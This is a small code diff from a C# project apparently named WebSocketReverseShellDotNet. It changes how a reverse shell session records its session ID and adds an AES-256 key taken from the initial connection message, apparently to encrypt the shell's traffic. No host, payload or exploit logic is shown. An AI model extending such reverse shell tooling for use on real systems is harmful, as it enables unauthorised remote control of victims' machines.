@@ -122,7 +122,8 @@ namespace WebSocketReverseShellDotNet.service.impl
                 //Console.WriteLine(initialConnectionMessage.GetSessionId());
                 if (initialConnectionMessage != null && initialConnectionMessage.GetSessionId() != null)
                 {
-                    ReverseShellSession.SessionId = initialConnectionMessage.GetSessionId();
+                    ReverseShellSession.SessionId = initialConnectionMessage.sessionId;
+                    ReverseShellSession.AES256Key = initialConnectionMessage.aes256Key;
                 }
             }
             catch (Exception ex)
